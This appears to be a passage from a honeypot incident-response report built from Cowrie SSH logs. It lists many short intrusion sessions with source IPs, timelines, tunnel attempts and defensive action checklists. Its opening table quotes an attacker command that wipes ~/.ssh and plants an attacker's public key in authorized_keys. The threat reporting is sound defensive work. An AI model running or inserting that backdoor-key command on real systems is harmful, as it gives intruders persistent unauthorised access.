| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:15:40` | `cowrie.session.connect` |
| `2026-08-01 05:15:40` | `cowrie.client.version` |
| `2026-08-01 05:15:40` | `cowrie.client.kex` |
| `2026-08-01 05:15:41` | `cowrie.login.success` |
| `2026-08-01 05:15:42` | `cowrie.session.params` |
| `2026-08-01 05:15:42` | `cowrie.command.input` |
| `2026-08-01 05:15:42` | `cowrie.command.failed` |
| `2026-08-01 05:15:43` | `cowrie.log.closed` |
| `2026-08-01 05:15:43` | `cowrie.session.params` |
| `2026-08-01 05:15:43` | `cowrie.command.input` |
| `2026-08-01 05:15:44` | `cowrie.session.file_download` |
| `2026-08-01 05:15:44` | `cowrie.log.closed` |
| `2026-08-01 05:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.169[.]176` to AbuseIPDB if not already reported
- [ ] Block `150.5.169[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b80c39381871

| Field | Detail |
|---|---|
| **Source IP** | `150.5.169[.]176` |
| **First Seen** | 2026-08-01 05:15 |
| **Last Seen** | 2026-08-01 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:15:44` | `cowrie.session.connect` |
| `2026-08-01 05:15:44` | `cowrie.client.version` |
| `2026-08-01 05:15:44` | `cowrie.client.kex` |
| `2026-08-01 05:15:45` | `cowrie.login.success` |
| `2026-08-01 05:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.169[.]176` to AbuseIPDB if not already reported
- [ ] Block `150.5.169[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2759f7ea288

| Field | Detail |
|---|---|
| **Source IP** | `150.5.169[.]176` |
| **First Seen** | 2026-08-01 05:15 |
| **Last Seen** | 2026-08-01 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:15:45` | `cowrie.session.connect` |
| `2026-08-01 05:15:45` | `cowrie.client.version` |
| `2026-08-01 05:15:46` | `cowrie.client.kex` |
| `2026-08-01 05:15:46` | `cowrie.login.success` |
| `2026-08-01 05:15:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.5.169[.]176` to AbuseIPDB if not already reported
- [ ] Block `150.5.169[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2eb97454ff28

| Field | Detail |
|---|---|
| **Source IP** | `220.179.87[.]204` |
| **First Seen** | 2026-08-01 05:15 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:15:54` | `cowrie.session.connect` |
| `2026-08-01 05:15:55` | `cowrie.client.version` |
| `2026-08-01 05:15:55` | `cowrie.client.kex` |
| `2026-08-01 05:15:57` | `cowrie.login.success` |
| `2026-08-01 05:15:58` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.179.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `220.179.87[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-854b826177aa

| Field | Detail |
|---|---|
| **Source IP** | `68.7.114[.]69` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:00` | `cowrie.session.connect` |
| `2026-08-01 05:16:00` | `cowrie.client.version` |
| `2026-08-01 05:16:00` | `cowrie.client.kex` |
| `2026-08-01 05:16:01` | `cowrie.login.success` |
| `2026-08-01 05:16:02` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.7.114[.]69` to AbuseIPDB if not already reported
- [ ] Block `68.7.114[.]69` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4698811d990

| Field | Detail |
|---|---|
| **Source IP** | `58.245.210[.]70` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:07` | `cowrie.session.connect` |
| `2026-08-01 05:16:08` | `cowrie.client.version` |
| `2026-08-01 05:16:08` | `cowrie.client.kex` |
| `2026-08-01 05:16:10` | `cowrie.login.success` |
| `2026-08-01 05:16:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.245.210[.]70` to AbuseIPDB if not already reported
- [ ] Block `58.245.210[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1adac2828e2

| Field | Detail |
|---|---|
| **Source IP** | `95.87.248[.]223` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:07` | `cowrie.session.connect` |
| `2026-08-01 05:16:08` | `cowrie.client.version` |
| `2026-08-01 05:16:08` | `cowrie.client.kex` |
| `2026-08-01 05:16:08` | `cowrie.login.success` |
| `2026-08-01 05:16:09` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.87.248[.]223` to AbuseIPDB if not already reported
- [ ] Block `95.87.248[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24ec4b4e37db

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:08` | `cowrie.session.connect` |
| `2026-08-01 05:16:08` | `cowrie.client.version` |
| `2026-08-01 05:16:08` | `cowrie.client.kex` |
| `2026-08-01 05:16:10` | `cowrie.login.success` |
| `2026-08-01 05:16:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92915a4f6c96

| Field | Detail |
|---|---|
| **Source IP** | `112.120.115[.]152` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:18` | `cowrie.session.connect` |
| `2026-08-01 05:16:19` | `cowrie.client.version` |
| `2026-08-01 05:16:19` | `cowrie.client.kex` |
| `2026-08-01 05:16:21` | `cowrie.login.success` |
| `2026-08-01 05:16:21` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.120.115[.]152` to AbuseIPDB if not already reported
- [ ] Block `112.120.115[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc912f76323c

| Field | Detail |
|---|---|
| **Source IP** | `115.46.88[.]68` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:26` | `cowrie.session.connect` |
| `2026-08-01 05:16:27` | `cowrie.client.version` |
| `2026-08-01 05:16:27` | `cowrie.client.kex` |
| `2026-08-01 05:16:29` | `cowrie.login.success` |
| `2026-08-01 05:16:30` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.46.88[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.46.88[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b65842c295c9

| Field | Detail |
|---|---|
| **Source IP** | `111.42.175[.]101` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:35` | `cowrie.session.connect` |
| `2026-08-01 05:16:36` | `cowrie.client.version` |
| `2026-08-01 05:16:36` | `cowrie.client.kex` |
| `2026-08-01 05:16:38` | `cowrie.login.success` |
| `2026-08-01 05:16:39` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.42.175[.]101` to AbuseIPDB if not already reported
- [ ] Block `111.42.175[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cf4e1fe079e

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:37` | `cowrie.session.connect` |
| `2026-08-01 05:16:37` | `cowrie.client.version` |
| `2026-08-01 05:16:37` | `cowrie.client.kex` |
| `2026-08-01 05:16:38` | `cowrie.login.success` |
| `2026-08-01 05:16:38` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fac49f56fd94

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:16 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:44` | `cowrie.session.connect` |
| `2026-08-01 05:16:46` | `cowrie.client.version` |
| `2026-08-01 05:16:46` | `cowrie.client.kex` |
| `2026-08-01 05:16:49` | `cowrie.login.success` |
| `2026-08-01 05:16:51` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea6d605f5e4e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-08-01 05:16 |
| **Last Seen** | 2026-08-01 05:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:16:55` | `cowrie.session.connect` |
| `2026-08-01 05:16:55` | `cowrie.client.version` |
| `2026-08-01 05:16:55` | `cowrie.client.kex` |
| `2026-08-01 05:16:57` | `cowrie.login.success` |
| `2026-08-01 05:16:57` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57064af6ad72

| Field | Detail |
|---|---|
| **Source IP** | `70.91.135[.]181` |
| **First Seen** | 2026-08-01 05:17 |
| **Last Seen** | 2026-08-01 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:17:09` | `cowrie.session.connect` |
| `2026-08-01 05:17:09` | `cowrie.client.version` |
| `2026-08-01 05:17:09` | `cowrie.client.kex` |
| `2026-08-01 05:17:10` | `cowrie.login.success` |
| `2026-08-01 05:17:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:17:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.91.135[.]181` to AbuseIPDB if not already reported
- [ ] Block `70.91.135[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7a27062fcc7

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]53` |
| **First Seen** | 2026-08-01 05:17 |
| **Last Seen** | 2026-08-01 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:17:15` | `cowrie.session.connect` |
| `2026-08-01 05:17:16` | `cowrie.client.version` |
| `2026-08-01 05:17:16` | `cowrie.client.kex` |
| `2026-08-01 05:17:17` | `cowrie.login.success` |
| `2026-08-01 05:17:17` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:17:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]53` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a15e991fb28b

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-01 05:18 |
| **Last Seen** | 2026-08-01 05:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:18:06` | `cowrie.session.connect` |
| `2026-08-01 05:18:07` | `cowrie.client.version` |
| `2026-08-01 05:18:07` | `cowrie.client.kex` |
| `2026-08-01 05:18:09` | `cowrie.login.success` |
| `2026-08-01 05:18:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b26922e9dbe0

| Field | Detail |
|---|---|
| **Source IP** | `117.211.15[.]106` |
| **First Seen** | 2026-08-01 05:18 |
| **Last Seen** | 2026-08-01 05:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:18:17` | `cowrie.session.connect` |
| `2026-08-01 05:18:18` | `cowrie.client.version` |
| `2026-08-01 05:18:18` | `cowrie.client.kex` |
| `2026-08-01 05:18:20` | `cowrie.login.success` |
| `2026-08-01 05:18:20` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:18:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.211.15[.]106` to AbuseIPDB if not already reported
- [ ] Block `117.211.15[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9644e241ffb2

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-08-01 05:18 |
| **Last Seen** | 2026-08-01 05:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:18:35` | `cowrie.session.connect` |
| `2026-08-01 05:18:35` | `cowrie.client.version` |
| `2026-08-01 05:18:35` | `cowrie.client.kex` |
| `2026-08-01 05:18:37` | `cowrie.login.success` |
| `2026-08-01 05:18:37` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f52a005d196

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-08-01 05:18 |
| **Last Seen** | 2026-08-01 05:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:18:42` | `cowrie.session.connect` |
| `2026-08-01 05:18:43` | `cowrie.client.version` |
| `2026-08-01 05:18:43` | `cowrie.client.kex` |
| `2026-08-01 05:18:43` | `cowrie.login.success` |
| `2026-08-01 05:18:44` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54efce9ca329

| Field | Detail |
|---|---|
| **Source IP** | `218.25.233[.]22` |
| **First Seen** | 2026-08-01 05:19 |
| **Last Seen** | 2026-08-01 05:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:19:34` | `cowrie.session.connect` |
| `2026-08-01 05:19:34` | `cowrie.client.version` |
| `2026-08-01 05:19:34` | `cowrie.client.kex` |
| `2026-08-01 05:19:37` | `cowrie.login.success` |
| `2026-08-01 05:19:38` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.25.233[.]22` to AbuseIPDB if not already reported
- [ ] Block `218.25.233[.]22` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96cbd782669f

| Field | Detail |
|---|---|
| **Source IP** | `121.128.84[.]224` |
| **First Seen** | 2026-08-01 05:19 |
| **Last Seen** | 2026-08-01 05:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:19:43` | `cowrie.session.connect` |
| `2026-08-01 05:19:43` | `cowrie.client.version` |
| `2026-08-01 05:19:43` | `cowrie.client.kex` |
| `2026-08-01 05:19:45` | `cowrie.login.success` |
| `2026-08-01 05:19:46` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:19:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.128.84[.]224` to AbuseIPDB if not already reported
- [ ] Block `121.128.84[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b6dc3f77753

| Field | Detail |
|---|---|
| **Source IP** | `89.253.90[.]113` |
| **First Seen** | 2026-08-01 05:20 |
| **Last Seen** | 2026-08-01 05:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:20:11` | `cowrie.session.connect` |
| `2026-08-01 05:20:11` | `cowrie.client.version` |
| `2026-08-01 05:20:11` | `cowrie.client.kex` |
| `2026-08-01 05:20:12` | `cowrie.login.success` |
| `2026-08-01 05:20:12` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.253.90[.]113` to AbuseIPDB if not already reported
- [ ] Block `89.253.90[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b79bfd420606

| Field | Detail |
|---|---|
| **Source IP** | `200.37.179[.]83` |
| **First Seen** | 2026-08-01 05:21 |
| **Last Seen** | 2026-08-01 05:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:21:01` | `cowrie.session.connect` |
| `2026-08-01 05:21:01` | `cowrie.client.version` |
| `2026-08-01 05:21:01` | `cowrie.client.kex` |
| `2026-08-01 05:21:03` | `cowrie.login.success` |
| `2026-08-01 05:21:03` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:21:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.179[.]83` to AbuseIPDB if not already reported
- [ ] Block `200.37.179[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a163aff1312

| Field | Detail |
|---|---|
| **Source IP** | `85.192.184[.]145` |
| **First Seen** | 2026-08-01 05:21 |
| **Last Seen** | 2026-08-01 05:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:21:09` | `cowrie.session.connect` |
| `2026-08-01 05:21:09` | `cowrie.client.version` |
| `2026-08-01 05:21:09` | `cowrie.client.kex` |
| `2026-08-01 05:21:10` | `cowrie.login.success` |
| `2026-08-01 05:21:10` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:21:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.192.184[.]145` to AbuseIPDB if not already reported
- [ ] Block `85.192.184[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd88069d0c8a

